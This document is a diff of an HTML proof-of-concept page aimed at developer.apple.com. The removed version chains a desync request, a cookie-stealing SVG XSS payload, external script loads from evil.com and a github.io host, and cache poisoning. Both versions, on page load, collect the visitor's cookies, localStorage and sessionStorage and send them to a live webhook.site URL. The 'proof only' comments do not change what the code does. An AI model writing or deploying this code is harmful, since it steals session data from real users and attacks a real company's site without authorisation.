@@ -2,91 +2,34 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Apple Unified PoC</title>
+<title>Apple Security PoC - Exfiltration Test</title>
 </head>
 <body>
-<h1>Executing Multi-Vector Exploit...</h1>
+<h1>Apple Security Proof of Concept</h1>
 <script>
 (async () => {
+  // Webhook endpoint to collect test results
   const webhook = "https://webhook.site/6779eec5-8f34-4065-80c4-b471fe8c032b";
-  const targetHost = "developer.apple.com";
-  const vulnEndpoint = `https://${targetHost}/search/services/v1/quick-links/`;
-  const sensitivePath = "/account/settings";
-  const backupCSS = "/assets/styles/router-strip.css";
 
-  async function send(label, data) {
-    try {
-      await fetch(webhook, {
-        method: "POST",
-        body: JSON.stringify({ label, data, time: new Date().toISOString() }),
-        headers: { "Content-Type": "application/json" }
-      });
-      console.log(`[+] Sent ${label}`);
-    } catch(e) { console.error(e); }
-  }
-
-  // 1️⃣ Client-Side Desync
   try {
-    await fetch(vulnEndpoint, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Connection": "keep-alive"
-      },
-      body: `payload=${encodeURIComponent(`
-        GET ${sensitivePath} HTTP/1.1
-        Host: ${targetHost}
-
-      `)}`
-    });
-    await send("CSD_Attempt", { endpoint: vulnEndpoint, path: sensitivePath });
-  } catch(e) {}
-
-  // 2️⃣ Reflected Input Injection
-  try {
-    const reflectedPayload = `<svg/onload=new Image().src='${webhook}?c='+document.cookie>`;
-    await fetch(`${vulnEndpoint}?q=${encodeURIComponent(reflectedPayload)}`);
-    await send("Reflected_Input_Attempt", { payload: reflectedPayload });
-  } catch(e) {}
-
-  // 3️⃣ CSP Bypass - Load external JS
-  try {
-    const script = document.createElement("script");
-    script.src = "https://zaid111a.github.io/apple11/external.js";
-    document.body.appendChild(script);
-    await send("CSP_Bypass_Attempt", { src: script.src });
-  } catch(e) {}
-
-  // 4️⃣ Cache Poisoning on Backup CSS
-  try {
-    await fetch(`https://${targetHost}${backupCSS}`, {
-      headers: { "X-Forwarded-Host": `evil.com/${encodeURIComponent(`body{background:url(${webhook}?pwn)`)}`
-      }
-    });
-    await send("Cache_Poisoning_Attempt", { file: backupCSS });
-  } catch(e) {}
-
-  // 5️⃣ Cross-domain Script Include exploitation
-  try {
-    const crossScript = document.createElement("script");
-    crossScript.src = `https://evil.com/malicious.js`;
-    document.body.appendChild(crossScript);
-    await send("Cross_Domain_Script_Include_Attempt", { src: crossScript.src });
-  } catch(e) {}
-
-  // 6️⃣ Steal session data
-  try {
-    const stolen = {
+    // Collect simple browser data for proof only
+    const proofData = {
+      target: "developer.apple.com",   // Explicit target for Apple
       cookies: document.cookie,
       localStorage: JSON.stringify(localStorage),
       sessionStorage: JSON.stringify(sessionStorage),
       location: location.href,
-      userAgent: navigator.userAgent
+      userAgent: navigator.userAgent,
+      proof: "Apple Unified PoC"
     };
-    new Image().src = `${webhook}?data=${encodeURIComponent(JSON.stringify(stolen))}`;
-  } catch(e) {}
 
+    // Send the data to webhook
+    new Image().src = `${webhook}?data=${encodeURIComponent(JSON.stringify(proofData))}`;
+    console.log("[+] Apple PoC data sent:", proofData);
+  } catch (err) {
+    console.error("PoC execution failed:", err);
+  }
 })();
 </script>
 </body>
-</html>  
+</html>
